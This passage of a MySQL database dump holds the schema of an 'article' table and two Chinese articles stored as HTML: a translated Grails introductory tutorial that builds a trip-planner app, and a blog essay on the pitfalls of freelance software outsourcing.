-- MySQL dump 10.13  Distrib 5.1.73, for redhat-linux-gnu (x86_64)
--
-- Host: localhost    Database: csdb
-- ------------------------------------------------------
-- Server version	5.1.73

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `article`
--

DROP TABLE IF EXISTS `article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `article` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `attention_num` bigint(20) NOT NULL,
  `create_date` varchar(255) NOT NULL,
  `creator_id` bigint(20) NOT NULL,
  `description` longtext,
  `reply_num` bigint(20) NOT NULL,
  `a_state` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `view_num` bigint(20) NOT NULL,
  `poster` varchar(255) DEFAULT NULL,
  `recommend_num` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_nb6yjppa00jokalk31nhti73l` (`creator_id`) USING BTREE,
  KEY `FKD458CCF663C1BCE4` (`creator_id`)
) ENGINE=MyISAM AUTO_INCREMENT=76 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `article`
--

LOCK TABLES `article` WRITE;
/*!40000 ALTER TABLE `article` DISABLE KEYS */;
INSERT INTO `article` VALUES (1,0,'20150604142903',2,'<p>请允许我借助另一种开源 Web 开发框架 &mdash;&mdash; Ruby on Rails &mdash;&mdash; 来介绍 Grails。Rails 一发布就迷住了开发人员。Rails 的脚手架功能使您可以用以前所需时间的一小部分完成一个新的项目。支持 Rails 的<em>约定优于配置（convention over configuration）</em>思想意味着，应用程序可以根据常识性的命名模式自动进行组装（auto-wire），而不必借助繁杂的、容易出错的 XML 配置文件。Ruby 的元编程功能使对象可以神奇地在运行时继承所需的方法和字段，而不会扰乱源代码。</p>\r\n\r\n<p>Rails 配得上它所受到的赞美和推崇（现在仍然如此），但是它使 Java 开发人员面临困难的选择。您会因为一个新平台的承诺而放弃自己熟悉的 Java 平台吗？如何处理已有的 Java 代码、已有的生产服务器和经验丰富的 Java 开发人员？</p>\r\n\r\n<p>关于本系列</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">Grails 是一种新型 Web 开发框架，它将常见的 Spring 和 Hibernate 等 Java 技术与当前流行的约定优于配置等实践相结合。Grails 是用 Groovy 编写的，它可以提供与遗留 Java 代码的无缝集成，同时还可以加入脚本编制语言的灵活性和动态性。学习完 Grails 之后，您将彻底改变看待 Web 开发的方式。</p>\r\n\r\n<p>Grails 为您提供 Rails 风格的开发体验，同时以可靠的 Java 技术作为坚强后盾。但是 Grails 不仅仅是 Rails 通往 Java 平台的简单入口。Grails 吸取了 Rails 的经验，并将它们与现代 Java 开发的意识相结合。可以认为 Grails 是受 Rails&nbsp;<em>启发</em>，而不是由 Rails&nbsp;<em>转化而来</em>。</p>\r\n\r\n<p>作为&nbsp;<em>Grails 入门</em>&nbsp;系列的开篇，本文介绍 Grails 框架，展示它的安装方法，遍览如何构建第一个 Grails 应用程序：介绍本系列后续文章的内容。</p>\r\n\r\n<p>Groovy 的威力</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">就像 Rails 与 Ruby 编程语言联系非常紧密一样，Grails 也离不开 Groovy（请参阅&nbsp;参考资料）。Groovy 是一种动态语言，它在 JVM 上运行，并且与 Java 语言无缝集成。如果阅读了 developerWorks 上的大型&nbsp;<em>实战 Groovy</em>&nbsp;系列，那么您已经了解了这种语言的威力。如果没有，也不必担心 &mdash; 在学习 Grails 的过程中，您将了解到很多关于 Groovy 的知识。Groovy 应该不难学，因为它是特意为 Java 开发人员而设计的。</p>\r\n\r\n<p>例如，Groovy 可以大大减少 Java 代码的数量。在 Groovy 中，不再需要为字段编写 getter 和 setter 方法，因为 Groovy 会自动提供它们。不再需要编写&nbsp;<code>for Iterator i = list.iterator()</code>&nbsp;来循环遍历一系列的项；<code>list.each</code>&nbsp;可以做相同的事情，而且看上去更简洁，表达更清晰。简言之，Groovy 就是 21 世纪的 Java 语言。</p>\r\n\r\n<p>如果 Java 开发人员只有重新编写整个应用程序才能利用 Groovy，那么 Groovy 对他们就没有多大的吸引力了。令人高兴的是，Groovy 可以无缝地与已有的代码库集成。Groovy 不会替代 Java 语言 &mdash; 它只是提供了增强。您可以很快地掌握 Groovy，因为说到底，Groovy 代码<em>就是</em>&nbsp;Java 代码。这两种语言是如此兼容，甚至可以将一个 .java 文件重命名为一个 .groovy 文件 &mdash; 例如，将 Person.java 改为 Person.groovy &mdash; 从而得到一个有效的（可执行的）Groovy 文件（虽然这个 Groovy 文件并没有用到 Groovy 提供的任何语法）。</p>\r\n\r\n<p>Groovy 与 Java 语言的深度兼容意味着 Grails 不需要重新创造内部使用的关键技术。相反，您可以以 Groovy 的方式查看熟悉的 Java 库。Groovy 封装了 JUnit&nbsp;<code>TestCase</code>&nbsp;并以&nbsp;<code>GroovyTestCase</code>&nbsp;形式提供。Grails 通过 GANT 对 Ant 构建进行了调整，GANT 是 Ant 的一个纯 Groovy 实现。Grails 将 Hibernate 包装在一个小小的 Groovy facade 中，并称之为 GORM &mdash; Grails Object/Relational Mapper。Grails 使您在利用已有的 Java 经验的同时，还可以利用最新的 Web 开发实践，以上只是其中的三个例子。</p>\r\n\r\n<p>不过，要想全面地鉴赏 Grails，还需要亲身体验一下。现在，让我们来安装 Grails，并创建第一个 Web 应用程序。</p>\r\n\r\n<p style=\"text-align:right\">回页首</p>\r\n\r\n<p>安装 Grails</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">运行 Grails 应用程序所需的一切都在一个 ZIP 文件中。所有的依赖库 &mdash; 例如 Groovy、Spring 和 Hibernate &mdash; 都已经在那里，随时可以使用。要安装 Grails：</p>\r\n\r\n<ol>\r\n	<li>从 Grails 站点（见&nbsp;参考资料）下载并解压 grails.zip。</li>\r\n	<li>创建一个&nbsp;<code>GRAILS_HOME</code>&nbsp;环境变量。</li>\r\n	<li>将 $GRAILS_HOME/bin 添加到&nbsp;<code>PATH</code>&nbsp;中。</li>\r\n</ol>\r\n\r\n<p>您<em>的确</em>&nbsp;需要安装一个 JDK（Grails 是不错，但是还没有好到&nbsp;<em>那种程度</em>）。Grails 1.0 可在 Java 1.4、1.5 和 1.6 上运行。如果不知道已经安装了哪个版本，可以在命令行提示符下输入&nbsp;<code>java -version</code>。必要时，下载并安装一个与 Grails 兼容的 JDK（见&nbsp;参考资料）。</p>\r\n\r\n<p>完成安装步骤后，输入&nbsp;<code>grails -version</code>&nbsp;以进行检查。如果看到以下友好信息，则说明一切都得到正确配置：</p>\r\n\r\n<pre>\r\nWelcome to Grails 1.0 - http://grails.org/\r\nLicensed under Apache Standard License 2.0\r\nGrails home is set to: /opt/grails</pre>\r\n\r\n<p>附带的 Web 服务器和数据库</p>\r\n\r\n<p>使用免费附带品</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">对于本文的应用程序，您将使用 Grails 免费提供的 Web 服务器和数据库。在将来的文章中，我将详细说明如何在您自己的服务器上运行 Grails。在此期间，请经常访问 grails.org 并浏览优秀的在线文档（见&nbsp;参考资料）。</p>\r\n\r\n<p>有趣的是，不需要单独安装 Web 服务器就可以运行 Grails 应用程序。 Grails 内置了 Jetty servlet 容器。只需输入&nbsp;<code>grails run-app</code>，就可以使应用程序在 Jetty 容器（见&nbsp;参考资料）中运行，而不必执行常见的部署过程。在已有的生产服务器上运行 Grails 应用程序也没有问题。通过输入&nbsp;<code>grails war</code>&nbsp;创建一个标准文件，然后可以将其部署到 Tomcat、JBoss、Geronimo、WebSphere&reg;，或者任何其他遵从 Java EE 2.4 的 servlet 容器。</p>\r\n\r\n<p>您也不需要单独安装数据库。Grails 附带了 HSQLDB（见&nbsp;参考资料），它是一个纯 Java 数据库。通过提供一个随时可用的数据库可以立即提高生产率。由于有了 Hibernate 和 GORM，使用其他数据库（例如 MySQL、PostgreSQL、Oracle Database 或 DB2）也很简单。如果有一个 JDBC driver JAR 再加上通常的连接设置，只需改变一下 DataSource.groovy，就可以立即使用您自己的数据库。</p>\r\n\r\n<p style=\"text-align:right\">回页首</p>\r\n\r\n<p>编写第一个 Grails 应用程序</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">我经常旅行 &mdash; 一年至少 40 趟。我发现，日程表可以很好地告诉我<em>何时</em>&nbsp;需要达到某个地方，但是不能显示那个地方在<em>哪里</em>。而在线地图刚好相反：它们可以解决地点问题，但不能解决时间问题。所以，在本文和本系列接下来的两篇文章中，您将构建一个定制的 Grails 应用程序，在计划旅程时，这个应用程序既可以用于解决时间问题，又可以用于解决地点问题。</p>\r\n\r\n<p>后续介绍</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">本系列后面的文章将讨论如何将 Google Calendar 和 Google Maps 与 Grails 相结合。</p>\r\n\r\n<p>首先，在一个空白目录下，输入&nbsp;<code>grails create-app trip-planner</code>。稍后，可以看到一个名为 trip-planner 的目录。同 Maven、Rails 和 AppFuse 一样，Grails 会建立一个标准的目录结构。如果您觉得这个目录结构限制了您，并且只有精心设计自己的定制目录树才能使用一个框架，那么这样使用 Grails 不会有多大的乐趣。约定优于配置中的<em>约定</em>&nbsp;部分使您可以拥有任何 Grails 应用程序，并立即知道各个部分之间的联系。</p>\r\n\r\n<p>进入 trip-planner 目录，并输入&nbsp;<code>grails create-domain-class Trip</code>。如果一切顺利，将得到两个新的文件：grails-app/domain/Trip.groovy 和 grails-app/test/integration/TripTests.groovy。在后面的文章中，我将谈到测试。目前，我们主要关注域类。一开始，域类看上去如清单 1 所示：</p>\r\n\r\n<p>清单 1. Grails 生成的域类</p>\r\n\r\n<pre>\r\nclass Trip{\r\n\r\n}</pre>\r\n\r\n<p>看上去没什么内容，对吗？接下来让我们来完善它。为&nbsp;<code>Trip</code>&nbsp;添加一些字段，如清单 2 所示：</p>\r\n\r\n<p>清单 2. 添加字段后的&nbsp;<code>Trip</code>&nbsp;类</p>\r\n\r\n<pre>\r\nclass Trip { \r\n  String name\r\n  String city\r\n  Date startDate\r\n  Date endDate\r\n  String purpose\r\n  String notes\r\n}</pre>\r\n\r\n<p>如前所述，这里不需要创建 getter 和 setter 方法：Groovy 会动态地生成它们。<code>Trip</code>&nbsp;还有很多新的、有用的动态方法，这些方法的名称非常易用理解：</p>\r\n\r\n<ul>\r\n	<li><code>Trip.save()</code>&nbsp;将数据<em>保存</em>&nbsp;到 HSQLDB 数据库中的&nbsp;<code>Trip</code>&nbsp;表中。</li>\r\n	<li><code>Trip.delete()</code>&nbsp;从&nbsp;<code>Trip</code>&nbsp;表中<em>删除</em>&nbsp;数据。</li>\r\n	<li><code>Trip.list()</code>&nbsp;返回一个&nbsp;<code>Trip</code>&nbsp;列表。</li>\r\n	<li><code>Trip.get()</code>&nbsp;返回一个&nbsp;<code>Trip</code>。</li>\r\n</ul>\r\n\r\n<p>所有这些方法都已经存在，您在需要的时候就可以使用它们。注意，<code>Trip</code>&nbsp;并没有扩展某个父类或者实现某个接口。由于 Groovy 的元编程功能，那些方法只是出现在适当类中的适当位置（只有 grails-app/domain 目录中的类才拥有这些与持久性相关的方法）。</p>\r\n\r\n<p>构建控制器和视图</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">创建域类只是成功的一半。每个模型都还需要一个良好的控制器和一些视图（我假设您熟悉 Model-View-Controller 模式；请参阅&nbsp;参考资料）。输入&nbsp;<code>grails generate-all Trip</code>，以构建一个 grails-app/controllers/TripController.groovy 类，并在 grails-app/views/Trip 中生成一组匹配的 Groovy Server Page（GSP）。对于控制器中的每个&nbsp;<code>list</code>&nbsp;动作，都有一个相应的 list.gsp 文件。<code>create</code>&nbsp;动作则对应于一个 create.gsp 文件。从这里可以看出约定优于配置的优点：无需 XML 文件就可以匹配这些元素。每个域类根据名称与一个控制器配对。控制器中的每个动作也是根据名称与一个视图配对。如果您愿意，也可以绕开这种基于名称的配置，但是大多数时候只需遵循约定，应用程序自然就可以运行。</p>\r\n\r\n<p>看看清单 3 所示的 grails-app/controller/TripController.groovy：</p>\r\n\r\n<p>清单 3.&nbsp;<code>TripController</code></p>\r\n\r\n<pre>\r\nclass TripController {\r\n    ...\r\n    def list = {\r\n        if(!params.max) params.max = 10\r\n        [ tripList: Trip.list( params ) ]\r\n    }\r\n    ...\r\n}</pre>\r\n\r\n<p>Java 开发人员首先会注意到的是，这么少的代码可以实现多少功能。以&nbsp;<code>list</code>&nbsp;动作为例。起重要作用的是最后一行。Grails 将返回一个 hashmap，其中只有一个名为&nbsp;<code>tripList</code>&nbsp;的元素。（Groovy 方法的最后一行是一个隐式的 return 语句。如果您愿意，也可以手动地输入单词<code>return</code>）。<code>tripList</code>&nbsp;元素是&nbsp;<code>Trip</code>&nbsp;对象的一个&nbsp;<code>ArrayList</code>，<code>Trip</code>&nbsp;对象是通过&nbsp;<code>Trip.list()</code>&nbsp;方法从数据库中拉出的。通常该方法将返回表中的全部记录。它上面的一行代码表示 &ldquo;如果 URL 中提供了一个 max 参数，那么使用它来限制返回的&nbsp;<code>Trip</code>&nbsp;的数量。否则，将&nbsp;<code>Trip</code>&nbsp;的数量限制为 10&rdquo;。URL http://localhost:8080/trip-planner/trip/list 将调用这个动作。例如，http://localhost:8080/trip-planner/trip/list?max=3 显示 3 个 trip，而不是通常的 10 个。如果有更多的 trip 要显示，Grails 会自动创建上一页和下一页的分页链接。</p>\r\n\r\n<p>那么，如何使用这个 hashmap？看看 grails-app/views/list.gsp，如清单 4 所示：</p>\r\n\r\n<p>清单 4. list.gsp</p>\r\n\r\n<pre>\r\n&lt;g:each in=&quot;${tripList}&quot; status=&quot;i&quot; var=&quot;trip&quot;&gt;\r\n  &lt;tr class=&quot;${(i % 2) == 0 ? &#39;odd&#39; : &#39;even&#39;}&quot;&gt;\r\n    &lt;td&gt;\r\n      &lt;g:link action=&quot;show&quot; id=&quot;${trip.id}&quot;&gt;${trip.id?.encodeAsHTML()}&lt;/g:link&gt;\r\n    &lt;/td&gt;\r\n  &lt;/tr&gt;\r\n&lt;/g:each&gt;</pre>\r\n\r\n<p>list.gsp 主要是一些老式 HTML 加上少量 GroovyTagLib。以&nbsp;<code>g:</code>&nbsp;为前缀的就是 GroovyTag。在清单 4 中，<code>g:each</code>&nbsp;遍历&nbsp;<code>tripList ArrayList</code>&nbsp;中的每个&nbsp;<code>Trip</code>，并构建一个格式良好的 HTML 表格。</p>\r\n\r\n<p>对控制器的理解可以归结为三个&nbsp;<em>R</em>：<em>return</em>、<em>redirect</em>&nbsp;和&nbsp;<em>render</em>。有些动作利用隐式的 return 语句将数据返回到具有相同名称的 GSP 页面。有些动作进行重定向。例如，如果 URL 中未指定动作，则将调用&nbsp;<code>index</code>：</p>\r\n\r\n<pre>\r\ndef index = { redirect(action:list,params:params) }</pre>\r\n\r\n<p>在此，<code>TripController</code>&nbsp;重定向到&nbsp;<code>list</code>&nbsp;动作，同时传递&nbsp;<code>params</code>&nbsp;hashmap 中的所有的参数（或&nbsp;<code>QueryString</code>）。</p>\r\n\r\n<p>最后，<code>save</code>&nbsp;动作（见清单 5）并没有相应的 save.gsp 页面。如果记录被成功地保存到数据库中，那么该动作会重定向到&nbsp;<code>show</code>&nbsp;动作页面。否则，它呈现 create.gsp 页面，以便显示错误，并让您重试。</p>\r\n\r\n<p>清单 5.&nbsp;<code>save</code>&nbsp;动作</p>\r\n\r\n<pre>\r\ndef save = {\r\n  def trip = new Trip(params)\r\n  if(!trip.hasErrors() &amp;&amp; trip.save()) {\r\n    flash.message = &quot;Trip ${trip.id} created&quot;\r\n    redirect(action:show,id:trip.id)\r\n  }\r\n  else {\r\n    render(view:&#39;create&#39;,model:[trip:trip])\r\n  }\r\n}</pre>\r\n\r\n<p>在此，我们不详细讨论 Grails 是如何工作的，而是看看它的实际效果。</p>\r\n\r\n<p style=\"text-align:right\">回页首</p>\r\n\r\n<p>应用程序的实际效果</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">在命令行输入&nbsp;<code>grails run-app</code>。控制台在快速显示一批 Log4j 消息之后，将显示如下所示的消息：</p>\r\n\r\n<pre>\r\nServer running. Browse to http://localhost:8080/trip-planner</pre>\r\n\r\n<p>如果端口 8080 上已经有一个服务器在运行，那么将显示一条核心转储信息：</p>\r\n\r\n<pre>\r\nServer failed to start: java.net.BindException: Address already in use</pre>\r\n\r\n<p>可以通过两种方法轻松更改 Jetty 所使用的端口。可以通过输入&nbsp;<code>grails -Dserver.port=9090 run-app</code>&nbsp;临时进行更改。如果要使更改持久，可以从 $GRAILS_HOME/scripts/Init.groovy 中找出以&nbsp;<code>serverPort</code>&nbsp;开头的那一行，并更改值：</p>\r\n\r\n<pre>\r\nserverPort = System.getProperty(&#39;server.port&#39;) ? \r\n             System.getProperty(&#39;server.port&#39;).toInteger() : 9090</pre>\r\n\r\n<p>使 Grails 在您选择的端口上运行之后，在 Web 浏览器中输入 URL。应该可以看到一个欢迎屏幕，其中列出所有的控制器，如图 1 所示：</p>\r\n\r\n<p>图 1. Grails 应用程序的欢迎屏幕</p>\r\n\r\n<p><img alt=\"Grails 应用程序的欢迎屏幕\" src=\"http://www.ibm.com/developerworks/cn/java/j-grails01158/welcome.jpg\" style=\"border:0px; color:rgb(0, 0, 0); font-family:arial,sans-serif; line-height:15px; margin:0px; outline:0px; padding:0px; vertical-align:baseline; width:568px\" /></p>\r\n\r\n<p>单击&nbsp;<strong>TripController</strong>&nbsp;链接。您有一个完整的 CRUD（创建、读取、更新、删除）应用程序可以使用。</p>\r\n\r\n<p>使用图 2 所示的页面创建新的 trip：</p>\r\n\r\n<p>图 2. Create Trip 页面</p>\r\n\r\n<p><img alt=\"创建 Trip\" src=\"http://www.ibm.com/developerworks/cn/java/j-grails01158/create.jpg\" style=\"border:0px; color:rgb(0, 0, 0); font-family:arial,sans-serif; line-height:15px; margin:0px; outline:0px; padding:0px; vertical-align:baseline; width:572px\" /></p>\r\n\r\n<p>使用图 3 所示的页面编辑 trip：</p>\r\n\r\n<p>图 3. Trip List 页面</p>\r\n\r\n<p><img alt=\"编辑 Trip\" src=\"http://www.ibm.com/developerworks/cn/java/j-grails01158/list.jpg\" style=\"border:0px; color:rgb(0, 0, 0); font-family:arial,sans-serif; line-height:15px; margin:0px; outline:0px; padding:0px; vertical-align:baseline; width:572px\" /></p>\r\n\r\n<p>准备和运行这个应用程序要花多长时间？需要多少代码？下面就是答案：</p>\r\n\r\n<ol>\r\n	<li>按下 Ctrl-C，关闭 Grails。</li>\r\n	<li>输入&nbsp;<code>grails stats</code>。</li>\r\n</ol>\r\n\r\n<p>屏幕上将显示输出：</p>\r\n\r\n<pre>\r\n  +----------------------+-------+-------+\r\n  | Name                 | Files |  LOC  |\r\n  +----------------------+-------+-------+\r\n  | Controllers          |     1 |    66 | \r\n  | Domain Classes       |     1 |     8 | \r\n  | Integration Tests    |     1 |     4 | \r\n  +----------------------+-------+-------+\r\n  | Totals               |     3 |    78 | \r\n  +----------------------+-------+-------+</pre>\r\n\r\n<p>只需不到 100 行代码，就可以实现应用程序的所有功能。看起来还不错。不过，最后我还要再展示一个窍门。</p>\r\n\r\n<p>生成控制器和视图是一项很好的学习体验，而磁盘上的物理文件则有助于说明各个部分是如何连接在一起的。不过在此需要做一件事：删除<code>TripController</code>&nbsp;类中的内容，并用下面的内容替代：</p>\r\n\r\n<pre>\r\n  class TripController{\r\n    def scaffold = Trip\r\n  }</pre>\r\n\r\n<p>这行代码告诉 Grails 像对待前一个控制器一样，在运行时在内存中动态地生成所有那些&nbsp;<code>list</code>、<code>save</code>&nbsp;和&nbsp;<code>edit</code>&nbsp;动作。仅仅 3 行代码就可以产生和 66 行代码一样的行为。</p>\r\n\r\n<p>再次输入&nbsp;<code>grails run-app</code>。是的 &mdash; 所有数据都没有了。不必担心。按下 Ctrl-C 关闭 Grails。这一次，输入&nbsp;<code>grails prod run-app</code>。现在处于生产模式下，这意味着在服务器重新启动之前，数据已被保存。通过一连串的单击进入&nbsp;<code>TripController</code>，保存一些记录。应用程序的行为应该没有什么不同。您已经知道，在浏览器中看到的一切，是由 15 行代码驱动的，可知 Grails 的威力有多大。</p>\r\n\r\n<p style=\"text-align:right\">回页首</p>\r\n\r\n<p>结束语</p>\r\n\r\n<p style=\"margin-left:0px; margin-right:0px\">希望您对 Grails 的初次体验感到满意。小小一个包中，竟包含了令人惊讶的威力，而您只是看到冰山一角。这个框架的安装非常简单，只需解压一个文件。通过输入几行命令，就可以从头创建一个应用程序。希望这次简单的介绍能勾起您对 Grails 的更大兴趣。当然，本文也为您打好了一个基础，您可以扩展这个例子，尝试各种新的、有趣的方面。</p>\r\n\r\n<p>在下个月的文章中，您将专门花一些时间来关注 GORM。您将把日期保存到一个 MySQL 数据库中，进行某些数据验证，并设置一个一对多的关系。不必添加很多代码，就可以明显增强 trip-planner 应用程序的功能。</p>\r\n\r\n<p>到那时，好好享受使用 Groovy 和 Grails 的乐趣吧。您对 Web 开发的看法将彻底改变。</p>\r\n',0,0,'精通 Grails: 构建您的第一个 Grails 应用程序',140,NULL,0),(2,0,'20150604171602',2,'<p><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我本身是 Java 工程师出身，写代码至今已超过 15 年，创业也超过 10 年，曾经外包过很多项目给别人，也接过很多外包的项目，现在不接了，只经营电子报发送平台，在二年内累积超过 5000 家企业用户使用。身处在创业圈，只要有创业朋友主动问过我的，我都会和他说如果你能不接就不要接 ( 当然我也知道，如果不是为了活下去，谁愿意接 ? )，因为这其中有太多陷阱，我分享如下给大家作个参考：&nbsp;</span><br />\r\n<br />\r\n<strong>因为你写代码很快</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">通常会出来接私活的工程师大多是有些年资，也会有自己擅常的工具及 library，所以往往可以很快完成主管交代的工作，会认为客户的需求只要能在很短的时间内完成，这个项目就赚钱了。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】项目完成的快慢取决于客户的心情，只要他心情不好，就慢慢拖吧。你以为你的 Code 可以 reuse，最后你才发现真正被 reuse 的是你的肝。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">因为你写代码很快，所以只要客户比价、杀价、压你结案时间，你就会心里想一下：嗯，只要我努力赶一下，应该没问题。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，无形中你就牺牲了你的利润空间，只有赚到微利，你知道工程师估完成时间的准确率有多少吗 ? 准确率有多高，赚到微利的机率就有多高。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你可以赚每年的维护费</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">接私活是这样，只要你接了，之后的维护客户也很难不找你维护，只要慢慢的累积，每年都会有可观的维护费可以赚。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你知道大部份台湾公司有个不成文规定，同一套系统的维护费预算是每年递减的，客户会想：系统每年调整也该稳定了吧，都稳定了你也没作什么事为什么还要拿这么多钱 ? 接下来，你可能会想说如果客户想加新功能第一个一定先找你，试想一下，叫你照着三年前自己写的代码架构来新增功能，如果没有吐血，大概代表这三年你也没什么长进。不接总行吧 ? 偏偏你就这么有责任感，你不接客户也只能打掉重来请别人重新作一套，你忍心吗 ? 所以你觉得这维护费好赚吗？&nbsp;</span><br />\r\n<br />\r\n<strong>因为你很能为客户着想</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你因为很为公司着想，常常在开发过程中发现缺了什么或是主管规划错了，你会主动的加班把这些缺的部份补上调好，公司对你赞誉有加，如果接私活的时候以这样的态度来对待自己的客户，那双方合作的感觉一定很好。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你的客户当然好啊，因为你主动帮他加功能把系统调的更好，都不用再花钱啊。加钱 ? 合约当初就签好了，如何告诉客户要加钱 ? 况且这是你自己主动要加功能的。可以不加吗 ? 可以啊，但你可以忍受你的作品明明可以更好的而不让它更好吗 ? 如果是当初规划就错了，不调整能验收吗 ?&nbsp;</span><br />\r\n<br />\r\n<strong>因为你知道客户要什么</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">因为在公司时主管常常也语无伦次，但你总是能分析出主管要的是什么，你也都能完成它，所以接私活时就算对方不懂技术，你也能完成他需要的功能。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你知道客户要的是什么吗 ? 不，你不知道，因为绝大部份客户自己要什么都不知道，而且你知道客户的上面还有老板吗 ? 你知道客户的老板要的是什么吗 ? 不，你不会知道，因为连他老板自己都不知道，这是最可怕的吗 ? 不，还有更可怕的，他们会告诉你他们知道想要的功能是什么，但你就是无法作出他们想要的。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你很能规划</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你是个逻辑观念很好的人，只要主管告诉你他的需求，你可以很快画出系统架构图、代码架构图甚至是资料库架构图，准确率非常高，所以接私活的时候只要客户告诉你需求，你很快脑中就会出现各种架构图雏形。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你知道规格是谁开的吗 ? 对，是客户开的，因为他不开你就无法报价，如果他要你开，你也怕开完后报价他不接受就等于作白工了。那你觉得客户的逻辑会有你好吗 ? 所以通常你要作的是先了解客户的逻辑，然后找出矛盾的地方，然后提出更好的解决方桉，这一段来来回回就要花不少时间了，喔对，这一段通常是收不到钱的，客户会觉得你要接我的项目，你本来就要先来了解我的需求。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你有团队</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">因为你在业界有一定的人脉了，自己会写代码，再找个业务高手、美编高手，这样最小单位就好，大家可以分工，这样接私活的问题就变少、进行更顺利。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，因为你有三个人，所以你只能接可以养活 &gt;= 3 个人的项目，这种项目通常会稍大一点，因为以上所述种种原因会造成结案很慢，如果不结案人卡在这个项目拿不到钱，新的项目接不了，怎么办 ? 对，加人，所以你的团队变成了 4 个人，接下来你只能接可以养活 &gt;= 4 个人的项目，这个时候如果来了个大项目呢 ? 对，你会陷入无限迴圈，直到你再也接不到更大的项目。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你想用客户的项目来练兵</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br 